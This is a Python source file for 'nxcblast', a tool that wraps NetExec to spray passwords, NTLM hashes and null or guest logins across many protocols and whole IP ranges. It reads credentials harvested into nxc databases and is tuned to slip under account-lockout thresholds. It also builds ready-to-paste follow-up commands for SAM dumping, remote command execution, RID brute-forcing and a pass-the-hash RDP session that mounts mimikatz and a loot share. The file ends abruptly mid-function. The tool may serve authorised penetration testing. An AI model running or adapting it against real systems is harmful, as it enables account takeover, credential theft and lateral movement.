#!/usr/bin/env python3
"""nxcblast -- spray credentials across every NetExec protocol at once.

Wraps `nxc` as a subprocess. Console shows hits only. Pastables on finish.
stdlib only -- no pip, no venv, no protocol reimplementation.
"""

from __future__ import annotations

import argparse
import configparser
import ipaddress
import json
import os
import re
import shutil
import signal
import sqlite3
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Callable, Optional, TextIO

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

PROTOCOLS = ["smb", "winrm", "rdp", "ssh", "ftp", "ldap", "mssql", "vnc", "wmi"]
PROTO_SET = set(PROTOCOLS)
PROTO_TOKENS = PROTO_SET | {"all"}

# Protocols where nxc --local-auth is meaningful.
LOCAL_AUTH_PROTOS = {"smb", "winrm", "wmi", "rdp"}

# Protocols that cannot use NTLM hashes.
HASH_SKIP_PROTOS = {"ssh"}

# 3-5 word summary of what nxc `Pwn3d!` means on a confirmed hit.
PWN3D_MEANING = {
    "smb": "local admin",
    "ldap": "path to DA",
    "winrm": "remote shell",
    "mssql": "sysadmin role",
    "rdp": "RDP code exec",
    "wmi": "local admin",
    "ssh": "root access",
    "vnc": "code execution",
    "nfs": "root write",
    # ftp: nxc never emits Pwn3d! (auth-only)
}

DEFAULT_LOCKOUT = 3
DEFAULT_LOCKOUT_DELAY = 60
# 0 = one worker per (protocol, target) lane -- all services on all boxes at once.
DEFAULT_THREADS = 0

ANSI_RE = re.compile(r"\x1b\[[0-9;]*[A-Za-z]|\x1b\][^\x07]*\x07|\x1b\([AB0]")
HEX32 = re.compile(r"^[0-9a-fA-F]{32}$")
HASH_PAIR_RE = re.compile(
    r"^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$|^[0-9a-fA-F]{32}$"
)

FAIL_MARKERS = (
    "STATUS_LOGON_FAILURE",
    "STATUS_ACCESS_DENIED",
    "STATUS_ACCOUNT_RESTRICTION",
    "STATUS_LOGON_TYPE_NOT_GRANTED",
    "STATUS_PASSWORD_EXPIRED",
    "STATUS_PASSWORD_MUST_CHANGE",
    "STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT",
    "STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT",
    "WRONG_PASSWORD",
    "LOGIN FAILED",
    "AUTHENTICATION FAILED",
    "AUTH FAILED",
    "ACCESS DENIED",
)

LOCKED_MARKERS = (
    "STATUS_ACCOUNT_LOCKED_OUT",
    "ACCOUNT_LOCKED_OUT",
    "LOCKED OUT",
)

# ---------------------------------------------------------------------------
# Color
# ---------------------------------------------------------------------------


class Color:
    """ANSI colors, disabled when stdout is not a TTY or NO_COLOR is set."""

    def __init__(self, enabled: Optional[bool] = None) -> None:
        if enabled is None:
            enabled = sys.stdout.isatty() and not os.environ.get("NO_COLOR")
        self.enabled = enabled
        self.reset = "\033[0m" if enabled else ""
        self.green = "\033[32m" if enabled else ""
        self.green_bold = "\033[1;32m" if enabled else ""
        self.yellow = "\033[1;33m" if enabled else ""
        self.blue = "\033[1;34m" if enabled else ""
        self.red = "\033[1;31m" if enabled else ""
        self.cyan = "\033[1;36m" if enabled else ""
        self.dim = "\033[2m" if enabled else ""
        self.bold = "\033[1m" if enabled else ""


C = Color()


def c_ok(msg: str) -> str:
    return f"{C.green_bold}[+]{C.reset} {msg}"


def c_info(msg: str) -> str:
    return f"{C.blue}[*]{C.reset} {msg}"


def c_warn(msg: str) -> str:
    return f"{C.yellow}[!]{C.reset} {msg}"


def c_err(msg: str) -> str:
    return f"{C.red}[-]{C.reset} {msg}"


def die(msg: str, code: int = 1) -> None:
    print(c_err(msg), file=sys.stderr)
    raise SystemExit(code)


# ---------------------------------------------------------------------------
# Data
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class Credential:
    username: str
    password: Optional[str] = None
    ntlm_hash: Optional[str] = None
    domain: str = ""
    kind: str = "password"  # password, hash, null, guest, user-only

    @property
    def secret_is_hash(self) -> bool:
        return bool(self.ntlm_hash) and self.password is None

    @property
    def display(self) -> str:
        user = self.username
        if self.domain and "\\" not in user and "@" not in user:
            user = f"{self.domain}\\{user}"
        if self.kind == "null":
            return "(null)"
        if self.ntlm_hash:
            return f"{user}::{self.ntlm_hash}"
        return f"{user}:{self.password if self.password is not None else ''}"

    def nt_hash_only(self) -> str:
        if not self.ntlm_hash:
            return ""
        if ":" in self.ntlm_hash:
            return self.ntlm_hash.split(":")[-1]
        return self.ntlm_hash


def auth_mode_of(protocol: str, extra_args: list[str], label: str = "") -> str:
    """How this attempt authenticated: domain, local, windows, mssql, internal."""
    if label == "mssql-windows":
        return "windows"
    if label == "mssql-local":
        return "mssql"
    if label == "mssql-internal":
        return "internal"
    if "--local-auth" in extra_args:
        return "local"
    if protocol in LOCAL_AUTH_PROTOS:
        return "domain"
    return ""


# Console METHOD column: D=domain, L=local, M=mssql. Windows MSSQL auth is D.
METHOD_LETTER = {
    "domain": "D",
    "local": "L",
    "windows": "D",
    "mssql": "M",
    "internal": "M",
}


def method_letter(mode: str) -> str:
    if not mode:
        return "-"
    return METHOD_LETTER.get(mode, "-")


@dataclass
class Hit:
    protocol: str
    target: str
    cred: Credential
    status: str
    timestamp: str
    line: str = ""
    extra_args: list[str] = field(default_factory=list)
    label: str = ""
    auth_mode: str = ""
    hostname: str = ""

    def __post_init__(self) -> None:
        if not self.auth_mode:
            self.auth_mode = auth_mode_of(self.protocol, self.extra_args, self.label)

    def uses_local_auth(self) -> bool:
        if self.label == "mssql-windows":
            return False
        if self.label in {"mssql-local", "mssql-internal"}:
            return True
        return "--local-auth" in self.extra_args

    def as_json(self) -> dict:
        return {
            "protocol": self.protocol,
            "target": self.target,
            "hostname": self.hostname or None,
            "user": self.cred.username,
            "pass": self.cred.password if not self.cred.secret_is_hash else None,
            "hash": self.cred.ntlm_hash,
            "status": self.status,
            "auth_mode": self.auth_mode or None,
            "method": method_letter(self.auth_mode),
            "timestamp": self.timestamp,
        }


@dataclass
class Job:
    protocol: str
    target: str
    cred: Credential
    extra_args: list[str] = field(default_factory=list)
    label: str = ""  # e.g. mssql-windows / mssql-local / mssql-internal

    def auth_mode(self) -> str:
        return auth_mode_of(self.protocol, self.extra_args, self.label)

    def combo_label(self) -> str:
        """Human label for progress: protocol plus domain/local/mssql mode."""
        mode = self.auth_mode()
        if mode:
            return f"{self.protocol} {mode}"
        return self.protocol


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def utc_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def strip_ansi(text: str) -> str:
    return ANSI_RE.sub("", text)


def sh_quote(value: str) -> str:
    """Single-quote a value for a pasteable shell command."""
    return "'" + value.replace("'", "'\\''") + "'"


def read_lines(path: str) -> list[str]:
    try:
        raw = Path(path).read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        die(f"cannot read {path}: {exc}")
    out: list[str] = []
    for line in raw.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        out.append(line)
    return out


def parse_user(raw: str) -> tuple[str, str]:
    """Split DOMAIN\\user or user@domain into (domain, username)."""
    raw = raw.strip()
    if "\\" in raw:
        domain, user = raw.split("\\", 1)
        return domain, user
    if "@" in raw and not raw.startswith("@"):
        user, domain = raw.split("@", 1)
        if domain and " " not in domain:
            return domain, user
    return "", raw


def looks_like_hash(value: str) -> bool:
    value = value.strip()
    if HASH_PAIR_RE.match(value):
        return True
    if ":" in value:
        lm, _, nt = value.partition(":")
        return bool(HEX32.match(lm) and HEX32.match(nt))
    return bool(HEX32.match(value))


def nxc_home() -> Path:
    override = os.environ.get("NXC_PATH")
    if override:
        return Path(override).expanduser()
    return Path.home() / ".nxc"


def current_workspace(home: Path) -> str:
    conf = home / "nxc.conf"
    if not conf.is_file():
        return "default"
    parser = configparser.ConfigParser()
    try:
        parser.read(conf)
        return parser.get("nxc", "workspace", fallback="default").strip() or "default"
    except (configparser.Error, OSError):
        return "default"


# ---------------------------------------------------------------------------
# Targets
# ---------------------------------------------------------------------------


def expand_cidr(token: str) -> Optional[list[str]]:
    if "/" not in token:
        return None
    try:
        net = ipaddress.ip_network(token, strict=False)
    except ValueError:
        return None
    if isinstance(net, ipaddress.IPv4Network) and net.prefixlen >= 31:
        return [str(ip) for ip in net]
    if isinstance(net, ipaddress.IPv6Network) and net.prefixlen >= 127:
        return [str(ip) for ip in net]
    return [str(ip) for ip in net.hosts()]


def expand_ip_range(token: str) -> Optional[list[str]]:
    """nxc-style ranges: 192.168.1.10-20 or 192.168.1.10-192.168.1.20."""
    if "-" not in token or "/" in token:
        return None
    start_s, _, end_s = token.partition("-")
    try:
        start_ip = ipaddress.ip_address(start_s)
    except ValueError:
        return None
    try:
        end_ip = ipaddress.ip_address(end_s)
    except ValueError:
        if start_ip.version != 4 or not re.fullmatch(r"\d{1,3}", end_s):
            return None
        octets = start_s.split(".")
        try:
            end_ip = ipaddress.ip_address(".".join(octets[:3] + [end_s]))
        except ValueError:
            return None
    if int(end_ip) < int(start_ip):
        return None
    return [str(ipaddress.ip_address(i)) for i in range(int(start_ip), int(end_ip) + 1)]


def split_target_token(token: str) -> list[str]:
    """Split comma-separated hosts, but never split a path that is a file."""
    token = token.strip()
    if not token:
        return []
    if Path(token).is_file():
        return [token]
    return [part.strip() for part in token.split(",") if part.strip()]


def split_auth_values(
    raws: Optional[list[str] | str], *, keep_blank: bool = False
) -> list[str]:
    """Flatten space-separated CLI values and comma-separated tokens.

    Same shape as targets: `-u Admin Administrator` and `-u Admin,Administrator`.
    Blank tokens are dropped unless keep_blank (so `-p ''` stays an empty password).
    """
    if raws is None:
        return []
    if isinstance(raws, str):
        raws = [raws]
    out: list[str] = []
    for raw in raws:
        if "," in raw:
            for part in raw.split(","):
                part = part.strip()
                if part or keep_blank:
                    out.append(part)
        else:
            stripped = raw.strip()
            if stripped:
                out.append(stripped)
            elif keep_blank:
                out.append(raw)
    return out


def expand_one_target(token: str) -> list[str]:
    token = token.strip()
    if not token:
        return []
    cidr = expand_cidr(token)
    if cidr is not None:
        return cidr
    ip_range = expand_ip_range(token)
    if ip_range is not None:
        return ip_range
    try:
        return [str(ipaddress.ip_address(token))]
    except ValueError:
        return [token]


def load_targets(raws: list[str] | str) -> list[str]:
    if isinstance(raws, str):
        raws = [raws]
    tokens: list[str] = []
    for raw in raws:
        path = Path(raw)
        if path.is_file():
            lines = read_lines(raw)
            if not lines:
                die(f"target file is empty: {raw}")
            for line in lines:
                tokens.extend(split_target_token(line))
        else:
            parts = split_target_token(raw)
            if not parts:
                continue
            tokens.extend(parts)
    seen: set[str] = set()
    out: list[str] = []
    for token in tokens:
        for host in expand_one_target(token):
            if host not in seen:
                seen.add(host)
                out.append(host)
    if not out:
        die("no targets resolved")
    return out


# ---------------------------------------------------------------------------
# Credentials
# ---------------------------------------------------------------------------


def parse_creds_line(line: str) -> Optional[Credential]:
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if line.startswith(":") and not line.startswith("::"):
        return None

    if "::" in line:
        user_part, hash_part = line.split("::", 1)
        domain, user = parse_user(user_part)
        hash_part = hash_part.strip()
        if not user or not hash_part:
            return None
        return Credential(
            username=user, ntlm_hash=hash_part, domain=domain, kind="hash"
        )

    if ":" not in line:
        return None
    user_part, secret = line.split(":", 1)
    domain, user = parse_user(user_part)
    if not user:
        return None
    secret = secret.strip()
    if looks_like_hash(secret):
        return Credential(username=user, ntlm_hash=secret, domain=domain, kind="hash")
    return Credential(username=user, password=secret, domain=domain, kind="password")


def load_creds_file(path: str) -> list[Credential]:
    creds: list[Credential] = []
    for line in read_lines(path):
        cred = parse_creds_line(line)
        if cred is None:
            print(c_warn(f"skipping malformed --creds line: {line}"), file=sys.stderr)
            continue
        creds.append(cred)
    return creds


def load_nxcdb() -> list[Credential]:
    """Pull confirmed plaintext/hash creds from the current nxc workspace."""
    home = nxc_home()
    workspace = current_workspace(home)
    ws_dir = home / "workspaces" / workspace
    if not ws_dir.is_dir():
        print(
            c_warn(f"nxcdb workspace not found: {ws_dir} (workspace={workspace})"),
            file=sys.stderr,
        )
        return []

    db_paths: list[Path] = []
    nxc_db = ws_dir / "nxc.db"
    if nxc_db.is_file():
        db_paths.append(nxc_db)
    for proto in PROTOCOLS:
        p = ws_dir / f"{proto}.db"
        if p.is_file():
            db_paths.append(p)

    if not db_paths:
        print(c_warn(f"no nxc databases in {ws_dir}"), file=sys.stderr)
        return []

    creds: list[Credential] = []
    seen: set[tuple] = set()
    for db_path in db_paths:
        creds.extend(_query_nxc_db(db_path, seen))
    return creds


def _table_names(conn: sqlite3.Connection) -> set[str]:
    rows = conn.execute(
        "SELECT name FROM sqlite_master WHERE type='table'"
    ).fetchall()
    return {r[0].lower() for r in rows}


def _query_nxc_db(db_path: Path, seen: set[tuple]) -> list[Credential]:
    out: list[Credential] = []
    try:
        conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
    except sqlite3.Error:
        try:
            conn = sqlite3.connect(str(db_path))
        except sqlite3.Error as exc:
            print(c_warn(f"nxcdb: cannot open {db_path}: {exc}"), file=sys.stderr)
            return out
    try:
        tables = _table_names(conn)
        if "users" not in tables:
            return out
        cols = {
            r[1].lower()
            for r in conn.execute("PRAGMA table_info(users)").fetchall()
        }
        if not {"username", "password", "credtype"} <= cols:
            return out

        has_loggedin = "loggedin_relations" in tables
        has_admin = "admin_relations" in tables
        has_pillage = "pillaged_from_hostid" in cols
        domain_col = "u.domain" if "domain" in cols else "''"

        confirmed = []
        if has_loggedin:
            confirmed.append(
                "EXISTS (SELECT 1 FROM loggedin_relations lr WHERE lr.userid = u.id)"
            )
        if has_admin:
            confirmed.append(
                "EXISTS (SELECT 1 FROM admin_relations ar WHERE ar.userid = u.id)"
            )
        if has_pillage:
            confirmed.append("u.pillaged_from_hostid IS NOT NULL")

        where = (
            "LOWER(u.credtype) IN ('plaintext', 'hash', 'password') "
            "AND u.username IS NOT NULL AND TRIM(u.username) != '' "
            "AND u.password IS NOT NULL AND TRIM(u.password) != ''"
        )
        if confirmed:
            where += " AND (" + " OR ".join(confirmed) + ")"

        sql = f"SELECT DISTINCT {domain_col}, u.username, u.password, u.credtype FROM users u WHERE {where}"
        try:
            rows = conn.execute(sql).fetchall()
        except sqlite3.Error:
            sql = (
                f"SELECT DISTINCT {domain_col}, u.username, u.password, u.credtype "
                "FROM users u WHERE LOWER(u.credtype) IN "
                "('plaintext', 'hash', 'password') "
                "AND u.username IS NOT NULL AND TRIM(u.username) != '' "
                "AND u.password IS NOT NULL AND TRIM(u.password) != ''"
            )
            rows = conn.execute(sql).fetchall()

        for domain, username, secret, credtype in rows:
            domain = (domain or "").strip()
            username = (username or "").strip()
            secret = (secret or "").strip()
            credtype = (credtype or "").strip().lower()
            if not username or not secret:
                continue
            kind = "hash" if credtype == "hash" or looks_like_hash(secret) else "password"
            key = (domain.lower(), username.lower(), secret, kind)
            if key in seen:
                continue
            seen.add(key)
            if kind == "hash":
                out.append(
                    Credential(
                        username=username,
                        ntlm_hash=secret,
                        domain=domain,
                        kind="hash",
                    )
                )
            else:
                out.append(
                    Credential(
                        username=username,
                        password=secret,
                        domain=domain,
                        kind="password",
                    )
                )
    except sqlite3.Error as exc:
        print(c_warn(f"nxcdb: query failed on {db_path}: {exc}"), file=sys.stderr)
    finally:
        conn.close()
    return out


def build_credentials(args: argparse.Namespace) -> list[Credential]:
    creds: list[Credential] = []
    seen: set[str] = set()

    def add(cred: Credential) -> None:
        key = cred.display
        if key not in seen:
            seen.add(key)
            creds.append(cred)

    users: list[tuple[str, str]] = []  # (domain, username)
    for raw in split_auth_values(args.u):
        users.append(parse_user(raw))
    if args.U:
        for line in read_lines(args.U):
            users.append(parse_user(line))

    passwords: list[str] = []
    if args.p is not None:
        passwords.extend(split_auth_values(args.p, keep_blank=True))
    if args.P:
        passwords.extend(read_lines(args.P))

    hashes: list[str] = []
    hashes.extend(split_auth_values(args.H))

    for domain, user in users:
        for password in passwords:
            add(
                Credential(
                    username=user,
                    password=password,
                    domain=domain,
                    kind="password",
                )
            )
        for ntlm in hashes:
            add(Credential(username=user, ntlm_hash=ntlm, domain=domain, kind="hash"))
        if args.user_only:
            add(
                Credential(
                    username=user, password="", domain=domain, kind="user-only"
                )
            )

    if args.creds:
        for cred in load_creds_file(args.creds):
            add(cred)

    if args.nxcdb:
        nxcdb_creds = load_nxcdb()
        print(c_info(f"Loaded {len(nxcdb_creds)} credential(s) from nxcdb"))
        for cred in nxcdb_creds:
            add(cred)

    if args.null or args.null_user:
        add(Credential(username="", password="", kind="null"))
    if args.guest:
        add(Credential(username="guest", password="", kind="guest"))

    return creds


def apply_default_auth(args: argparse.Namespace) -> None:
    """When no secret is given, enable username-only / null / guest as needed.

    - `-u USER` without `-p/-P/-H/--creds/--nxcdb` → `--user-only`
    - no user and no secret → `--null`, `--null-user`, `--guest`
    """
    has_secret = bool(
        args.p is not None or args.P or args.H or args.creds or args.nxcdb
    )
    has_user = bool(args.u or args.U)
    if has_user and not has_secret:
        args.user_only = True
    if has_secret or has_user:
        return
    if args.null or args.null_user or args.guest or args.user_only:
        return
    args.null = True
    args.null_user = True
    args.guest = True


def has_auth_method(args: argparse.Namespace) -> bool:
    return any(
        [
            args.u,
            args.U,
            args.p is not None,
            args.P,
            args.H,
            args.creds,
            args.nxcdb,
            args.null,
            args.null_user,
            args.guest,
            args.user_only,
        ]
    )


# ---------------------------------------------------------------------------
# Hit parsing
# ---------------------------------------------------------------------------


STATUS_RANK = {
    "Pwn3d!": 100,
    "Shell": 90,
    "STATUS_SUCCESS": 80,
    "Guest": 50,
    "READ ONLY": 40,
    "valid": 10,
}


def _status_from_line(line: str) -> str:
    low = line.lower()
    if "pwn3d" in low:
        return "Pwn3d!"
    if "(shell)" in low:
        return "Shell"
    if "status_success" in low:
        return "STATUS_SUCCESS"
    if "(guest)" in low:
        return "Guest"
    if "read only" in low or "(read" in low:
        return "READ ONLY"
    parens = re.findall(r"\(([^)]+)\)", line)
    for p in reversed(parens):
        if p.lower() not in {"smb", "winrm", "rdp", "ssh", "ftp", "ldap", "mssql", "vnc", "wmi"}:
            if p.strip():
                return p.strip()
    return "valid"


# nxc table: PROTO  IP  PORT  HOSTNAME  [+]/[-]/[*] message
NXC_ROW_RE = re.compile(
    r"^(?:SMB|WINRM|RDP|SSH|FTP|LDAP|MSSQL|VNC|WMI)\s+"
    r"\S+\s+"
    r"\d+\s+"
    r"(?P<hostname>\S+)\s+"
    r"\[",
    re.I,
)
NXC_NAME_RE = re.compile(r"\(name:([^)]+)\)", re.I)


def _looks_like_hostname(value: str) -> bool:
    if not value or value in {"[+]", "[-]", "[*]", "-", "*"}:
        return False
    if value.upper().startswith("SSH-"):
        return False
    if value.lower().startswith("windows"):
        return False
    if value.startswith("(") or "/" in value:
        return False
    return True


def extract_hostname(stdout: str) -> str:
    """Best-effort hostname from nxc stdout: (name:X) then the HOSTNAME column."""
    text = strip_ansi(stdout or "")
    from_name = ""
    from_col = ""
    for raw in text.splitlines():
        line = raw.strip()
        if not line:
            continue
        m = NXC_NAME_RE.search(line)
        if m:
            name = m.group(1).strip()
            if name:
                from_name = name
        row = NXC_ROW_RE.match(line)
        if row:
            host = row.group("hostname").strip()
            if _looks_like_hostname(host):
                from_col = host
    return from_name or from_col


def parse_nxc_output(
    stdout: str,
    protocol: str,
    target: str,
    cred: Credential,
    extra_args: Optional[list[str]] = None,
    label: str = "",
) -> tuple[list[Hit], bool]:
    """Return (hits, account_locked). Never uses the process exit code."""
    text = strip_ansi(stdout or "")
    hits: list[Hit] = []
    locked = False
    best: Optional[Hit] = None
    extra = list(extra_args or [])
    hostname = extract_hostname(text)

    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line:
            continue
        upper = line.upper()
        if any(m in upper for m in LOCKED_MARKERS):
            locked = True
        if "[-]" in line and "[+]" not in line:
            continue
        if any(m in upper for m in FAIL_MARKERS):
            continue
        if "[*]" in line and "[+]" not in line:
            continue

        is_hit = False
        low = line.lower()
        if "[+]" in line:
            is_hit = True
        elif "pwn3d" in low or "status_success" in low or "(shell)" in low:
            is_hit = True

        if not is_hit:
            continue

        status = _status_from_line(line)
        hit = Hit(
            protocol=protocol,
            target=target,
            cred=cred,
            status=status,
            timestamp=utc_now(),
            line=line,
            extra_args=list(extra),
            label=label,
            hostname=hostname,
        )
        if best is None or STATUS_RANK.get(status, 1) > STATUS_RANK.get(best.status, 1):
            best = hit

    if best:
        hits.append(best)
    return hits, locked


# ---------------------------------------------------------------------------
# Lockout
# ---------------------------------------------------------------------------


class LockoutTracker:
    """Soft lockout guard: unique creds per (target, domain), pause at N.

    Same password across protocols counts once. Ctrl+C during a pause skips
    that target; Ctrl+C otherwise stops the spray. Pauses are silent on the
    console (logged only).
    """

    def __init__(self, threshold: int, delay: float) -> None:
        self.threshold = threshold
        self.delay = delay
        self._lock = threading.Lock()
        self._key_locks: dict[tuple[str, str], threading.Lock] = {}
        self.counts: dict[tuple[str, str], int] = {}
        self.attempted: dict[tuple[str, str], set[str]] = {}
        self.aborted_targets: set[str] = set()
        self.locked_out: set[tuple[str, str]] = set()
        self.shutdown = threading.Event()
        self.pause_active = threading.Event()
        self.pause_skip = threading.Event()
        self.pause_target: Optional[str] = None
        self._print_lock = threading.Lock()

    def key_lock(self, key: tuple[str, str]) -> threading.Lock:
        with self._lock:
            if key not in self._key_locks:
                self._key_locks[key] = threading.Lock()
            return self._key_locks[key]

    def domain_key(self, target: str, cred: Credential) -> tuple[str, str]:
        domain = cred.domain or ""
        return (target, domain.lower())

    def should_skip(self, target: str, cred: Credential) -> bool:
        if self.shutdown.is_set():
            return True
        if target in self.aborted_targets:
            return True
        key = self.domain_key(target, cred)
        return key in self.locked_out

    def abort_target(self, target: str, reason: str) -> None:
        self.aborted_targets.add(target)
        with self._print_lock:
            _clear_progress()
            print(c_warn(f"ABORT TARGET: {target} | {reason}"))

    def mark_locked_out(self, target: str, cred: Credential) -> None:
        key = self.domain_key(target, cred)
        self.locked_out.add(key)
        with self._print_lock:
            _clear_progress()
            user = cred.display
            print(
                c_warn(
                    f"ACCOUNT LOCKED: {target} | {user} | STATUS_ACCOUNT_LOCKED_OUT"
                )
            )

    def enter(self, target: str, cred: Credential) -> bool:
        """Reserve this unique cred for (target, domain). Does not hold a lock during nxc.

        Same password across protocols counts once. New unique creds at the
        threshold pause; already-seen creds (other protocols) are not blocked.
        """
        if self.threshold <= 0:
            return not self.should_skip(target, cred)

        key = self.domain_key(target, cred)
        klock = self.key_lock(key)
        cred_id = cred.display

        while True:
            if self.should_skip(target, cred):
                return False
            pause_count: Optional[int] = None
            with klock:
                if self.should_skip(target, cred):
                    return False
                seen = self.attempted.setdefault(key, set())
                if cred_id in seen:
                    return True
                count = self.counts.get(key, 0)
                if count < self.threshold:
                    seen.add(cred_id)
                    self.counts[key] = count + 1
                    return True
                pause_count = count
            if pause_count is None:
                return False
            if not self._pause(target, pause_count):
                return False
            with klock:
                self.counts[key] = 0
                self.attempted.setdefault(key, set()).clear()

    def leave(self, target: str, cred: Credential) -> None:
        # Count is updated in enter(); nothing to release during nxc.
        return

    def _pause(self, target: str, count: int) -> bool:
        if self.shutdown.is_set() or target in self.aborted_targets:
            return False
        self.pause_skip.clear()
        self.pause_target = target
        self.pause_active.set()
        log_write(
            f"{utc_now()} | lockout pause | {target} | {count} unique creds | "
            f"{int(self.delay)}s\n"
        )
        deadline = time.time() + self.delay
        skipped = False
        while time.time() < deadline:
            if self.shutdown.is_set():
                skipped = True
                break
            if self.pause_skip.is_set() or target in self.aborted_targets:
                skipped = True
                break
            time.sleep(0.2)
        self.pause_active.clear()
        self.pause_target = None
        if self.shutdown.is_set():
            return False
        if skipped or target in self.aborted_targets:
            self.aborted_targets.add(target)
            with self._print_lock:
                _clear_progress()
                print(c_warn(f"Skipping remaining attempts on {target}"))
            return False
        return True


# ---------------------------------------------------------------------------
# Logging / progress
# ---------------------------------------------------------------------------

_progress_lock = threading.Lock()
_progress_len = 0
_quiet = False
_log_fh: Optional[TextIO] = None
_log_lock = threading.Lock()


def _clear_progress() -> None:
    global _progress_len
    if _quiet or _progress_len <= 0:
        return
    sys.stderr.write("\r" + " " * _progress_len + "\r")
    sys.stderr.flush()
    _progress_len = 0


def _progress_bar(done: int, total: int, width: int = 16) -> str:
    if total <= 0:
        frac = 1.0
    else:
        frac = min(max(done / total, 0.0), 1.0)
    filled = int(width * frac)
    if filled > width:
        filled = width
    return "[" + "#" * filled + "-" * (width - filled) + "]"


def show_progress(msg: str) -> None:
    global _progress_len
    if _quiet or not sys.stderr.isatty():
        return
    with _progress_lock:
        text = f"{C.dim}[*] {msg}{C.reset}"
        pad = max(0, _progress_len - len(strip_ansi(text)))
        sys.stderr.write("\r" + text + (" " * pad))
        sys.stderr.flush()
        _progress_len = len(strip_ansi(text))


def emit(msg: str) -> None:
    with _progress_lock:
        _clear_progress()
        print(msg, flush=True)


def log_write(text: str) -> None:
    if _log_fh is None:
        return
    with _log_lock:
        _log_fh.write(text)
        if not text.endswith("\n"):
            _log_fh.write("\n")
        _log_fh.flush()


def argv_to_str(argv: list[str]) -> str:
    parts = []
    for a in argv:
        if a == "" or any(ch in a for ch in " \t'\"$&|;<>*?[](){}\\"):
            parts.append(sh_quote(a))
        else:
            parts.append(a)
    return " ".join(parts)


# ---------------------------------------------------------------------------
# nxc invocation
# ---------------------------------------------------------------------------


def find_nxc() -> str:
    path = shutil.which("nxc")
    if path:
        return path
    alt = shutil.which("netexec")
    if alt:
        return alt
    die(
        "nxc not found in PATH. Install NetExec: "
        "https://github.com/Pennyw0rth/NetExec"
    )
    raise SystemExit(1)  # unreachable, keeps type checkers happy


def build_nxc_argv(
    nxc: str,
    job: Job,
) -> list[str]:
    cred = job.cred
    argv = [nxc, job.protocol, job.target]

    if cred.kind == "null":
        argv += ["-u", "", "-p", ""]
    elif cred.secret_is_hash:
        argv += ["-u", cred.username, "-H", cred.ntlm_hash or ""]
    else:
        argv += ["-u", cred.username, "-p", cred.password if cred.password is not None else ""]

    if cred.domain and "\\" not in cred.username:
        argv += ["-d", cred.domain]

    argv.extend(job.extra_args)
    return argv


def run_nxc(argv: list[str]) -> str:
    env = os.environ.copy()
    env.setdefault("PYTHONUNBUFFERED", "1")
    try:
        proc = subprocess.run(
            argv,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            errors="replace",
            env=env,
        )
    except FileNotFoundError:
        die("nxc disappeared from PATH during the run")
    except OSError as exc:
        return f"[-] failed to execute nxc: {exc}\n"
    return proc.stdout or ""


# ---------------------------------------------------------------------------
# Pastables
# ---------------------------------------------------------------------------


def _shell_user(username: str) -> str:
    if not username:
        return "''"
    if re.fullmatch(r"[A-Za-z0-9_.\\@-]+", username):
        return username
    return sh_quote(username)


def _auth_flags(cred: Credential, local: bool = False) -> tuple[str, str]:
    """Return (nxc_auth fragment, 'hash'|'password')."""
    u = _shell_user(cred.username)
    dflag = ""
    if not local and cred.domain and "\\" not in cred.username:
        dflag = f" -d {_shell_user(cred.domain)}"
    if cred.kind == "null":
        return f"-u '' -p ''{dflag}", "password"
    if cred.secret_is_hash:
        return f"-u {u} -H {cred.ntlm_hash}{dflag}", "hash"
    return f"-u {u} -p {sh_quote(cred.password or '')}{dflag}", "password"


def _nxc_cmd(proto: str, target: str, nxc_auth: str, local: bool, suffix: str = "") -> str:
    local_flag = " --local-auth" if local else ""
    extra = f" {suffix}" if suffix else ""
    return f"nxc {proto} {target} {nxc_auth}{local_flag}{extra}".rstrip()


def hit_has_exec(hit: Hit) -> bool:
    """True when nxc reported admin/exec (Pwn3d! or Shell), not merely valid creds."""
    if hit.protocol == "ftp":
        return False
    low = (hit.status or "").lower()
    return "pwn3d" in low or "shell" in low


def _impacket_spec(cred: Credential, target: str, local: bool) -> tuple[str, str]:
    """Return (quoted host spec, extra flags) for impacket-smbexec."""
    user = cred.username or ""
    if local:
        auth = f"./{user}" if user else "./"
    elif cred.domain and "\\" not in cred.username:
        auth = f"{cred.domain}/{user}"
    else:
        auth = user
    if cred.secret_is_hash:
        h = cred.ntlm_hash or ""
        if ":" not in h:
            h = f":{h}"
        return sh_quote(f"{auth}@{target}"), f" -hashes {h}"
    pw = cred.password or ""
    return sh_quote(f"{auth}:{pw}@{target}"), ""


def _rdp_pastable(hit: Hit) -> str:
    cred = hit.cred
    t = hit.target
    u = cred.username or ""
    d = cred.domain or ""
    if cred.secret_is_hash:
        secret = f"/pth:{cred.nt_hash_only()}"
    else:
        secret = f"/p:{sh_quote(cred.password or '')}"
    return (
        f'mkdir -p "$HOME/my_data/loot"; '
        f"xfreerdp3 /clipboard /dynamic-resolution /cert:ignore "
        f"/drive:'/usr/share/windows-resources/mimikatz/x64',share "
        f'/drive:"$HOME/my_data/loot",loot '
        f"/v:{t} /d:{d} /u:{u} {secret}"
    )


def pastables_for_hit(hit: Hit) -> list[str]:
    cred = hit.cred
    t = hit.target
    proto = hit.protocol
    local = hit.uses_local_auth()
    nxc_auth, kind = _auth_flags(cred, local=local)
    u = cred.username or "''"
    p = sh_quote(cred.password or "")
    nth = cred.nt_hash_only()
    lines: list[str] = []

    low_priv = cred.kind in {"null", "guest", "user-only"}
    can_exec = hit_has_exec(hit) and not low_priv

    if proto == "smb":
        lines.append(
            _nxc_cmd(
                "smb",
                t,
                nxc_auth,
                local,
                "--users --shares --pass-pol --rid-brute 10000",
            )
        )
        if can_exec:
            spec, extra = _impacket_spec(cred, t, local)
            lines.append(_nxc_cmd("smb", t, nxc_auth, local, "--sam"))
            lines.append(_nxc_cmd("smb", t, nxc_auth, local, "-x whoami"))
